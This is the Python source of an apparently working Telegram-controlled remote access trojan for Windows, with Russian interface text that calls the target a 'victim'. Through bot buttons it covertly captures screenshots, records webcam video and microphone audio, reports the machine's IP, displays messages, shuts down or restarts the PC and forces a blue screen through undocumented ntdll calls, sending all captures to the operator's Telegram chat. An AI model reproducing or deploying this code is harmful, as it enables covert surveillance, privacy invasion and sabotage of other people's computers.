import os
import telebot
from PIL import ImageGrab
import tempfile
import ctypes
import cv2
import threading
import pyaudio
import wave
from moviepy.editor import *
from telebot.types import Message
import requests
import easygui as eg


API = 'ТОКЕН'

bot = telebot.TeleBot(API)

def create_inline_keyboard():
    keyboard = telebot.types.InlineKeyboardMarkup()
    keyboard.row_width = 2
    keyboard.add(
        telebot.types.InlineKeyboardButton('Скрин экрана ПК', callback_data='screenshot'),
        telebot.types.InlineKeyboardButton('Выключить ПК', callback_data='shutdown'),
        telebot.types.InlineKeyboardButton('Перезагрузить ПК', callback_data='restart'),
        telebot.types.InlineKeyboardButton('Вызвать BSOD', callback_data='bsod'),
        telebot.types.InlineKeyboardButton('Коннект к веб камере', callback_data='camera'),
        telebot.types.InlineKeyboardButton('Узнать IP компьютера', callback_data='get_ip'),
        telebot.types.InlineKeyboardButton('Вывести СМС на экран ПК', callback_data='messcren')
    )
    return keyboard

user_data = {}
INPUT_DURATION = 0

def record_video(duration):
    cap = cv2.VideoCapture(0)
    video_frames = []
    
    frames_to_record = duration * 30
    frames_recorded = 0

    while frames_recorded < frames_to_record:
        ret, frame = cap.read()
        if ret:
            video_frames.append(frame)
            frames_recorded += 1
        
    cap.release()  

    out = cv2.VideoWriter("temp_video.avi", cv2.VideoWriter_fourcc(*"XVID"), 30, (640, 480))
    for frame in video_frames:
        out.write(frame)
    out.release()  

def record_audio(filename, duration=10):
    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    CHANNELS = 1
    RATE = 44100

    audio = pyaudio.PyAudio()

    stream = audio.open(format=FORMAT,
                        channels=CHANNELS,
                        rate=RATE,
                        input=True,
                        frames_per_buffer=CHUNK)

    frames = []

    print("Recording audio...")
    for _ in range(int(RATE / CHUNK * duration)):
        data = stream.read(CHUNK)
        frames.append(data)

    print("Finished recording.")
    stream.stop_stream()
    stream.close()
    audio.terminate()


    wf = wave.open(filename, "wb")
    wf.setnchannels(CHANNELS)
    wf.setsampwidth(audio.get_sample_size(FORMAT))
    wf.setframerate(RATE)
    wf.writeframes(b"".join(frames))
    wf.close()

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.send_message(message.chat.id, 'Привет! Что вы хотите сделать?', reply_markup=create_inline_keyboard())

def send_screenshot(message):
    path = tempfile.gettempdir() + '/screenshot.png'
    screenshot = ImageGrab.grab()
    screenshot.save(path, 'PNG')
    bot.send_photo(message.chat.id, open(path, 'rb'))


@bot.callback_query_handler(func=lambda call: True)
def handle_callback_query(call):
    if call.data == 'screenshot':
        bot.send_message(call.message.chat.id, 'Делаю скриншот экрана...')
        send_screenshot(call.message)
    elif call.data == 'shutdown':
        bot.send_message(call.message.chat.id, 'Выключаю...')
        os.system('shutdown -s -t 0')
    elif call.data == 'restart':
        bot.send_message(call.message.chat.id, 'Перезагружаю...')
        os.system('shutdown -r -t 0')
    elif call.data == 'bsod':
        bot.send_message(call.message.chat.id, 'Вызываю синий экран смерти...')
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
    elif call.data == 'get_ip':
        bot.send_message(call.message.chat.id, 'Узнаю IP компьютера...')
        get_computer_ip(call.message)
    elif call.data == 'messcren':
        bot.send_message(call.message.chat.id, 'Введите сообщение для отображения на экране жертвы:')
        bot.register_next_step_handler(call.message, show_messagebox)
    elif call.data == 'camera':
        bot.send_message(call.message.chat.id, 'Введите, сколько времени записывать видео и аудио (в секундах):')
        bot.register_next_step_handler(call.message, start_video_and_audio_recording)

def start_video_and_audio_recording(message: Message):
    try:
        duration = int(message.text)
        if duration < 1:
            bot.send_message(message.chat.id, 'Некорректное время. Введите положительное число больше 0.')
            return

        bot.send_message(message.chat.id, f'Подключаюсь к камере и записываю видео и аудио в течение {duration} секунд...')

        video_thread = threading.Thread(target=record_video, args=(duration,))
        audio_thread = threading.Thread(target=record_audio, args=("temp_audio.wav", duration))

        video_thread.start()
        audio_thread.start()

        video_thread.join()
        audio_thread.join()
        
        bot.send_message(message.chat.id, 'Записи завершены. Объединяю аудио и видео...')
        
  
        video_clip = VideoFileClip("temp_video.avi")
        audio_clip = AudioFileClip("temp_audio.wav")
        final_clip = video_clip.set_audio(audio_clip)
        final_clip.write_videofile("final_video.mp4", codec="libx264")

        bot.send_message(message.chat.id, 'Видео готово! Отправляю...')
        with open("final_video.mp4", "rb") as video_file:
            bot.send_video(message.chat.id, video_file)


        os.remove("temp_video.avi")
        os.remove("temp_audio.wav")
        os.remove("final_video.mp4")

    except ValueError:
        bot.send_message(message.chat.id, 'Некорректное время. Введите положительное число.')

def get_computer_ip(message):
    try:
        response = requests.get('https://api.ipify.org?format=json')
        if response.status_code == 200:
            data = response.json()
            ip_address = data['ip']
            bot.send_message(message.chat.id, f'IP компьютера: {ip_address}')
        else:
            bot.send_message(message.chat.id, 'Не удалось получить IP компьютера.')
    except Exception as e:
        bot.send_message(message.chat.id, 'Произошла ошибка при получении IP компьютера.')

def show_messagebox(message: Message):
    eg.msgbox(message.text, "Сообщение")
    bot.send_message(message.chat.id, 'Сообщение было получено.\nВаша жертва закрыла окно с вашим сообщением и я вам об этом написал.')




bot.infinity_polling()
